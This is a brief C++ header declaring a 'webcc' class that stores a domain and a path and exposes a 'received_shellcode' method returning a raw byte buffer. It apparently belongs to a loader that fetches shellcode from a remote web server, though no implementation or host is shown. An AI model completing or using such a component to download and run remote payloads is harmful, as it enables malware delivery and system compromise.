#pragma once

#include <string>

class webcc {
public:
    webcc(std::string domain, std::string path); 
    std::pair<unsigned char*, int> received_shellcode(void);

private:
    std::string domain;
    std::string path;
};
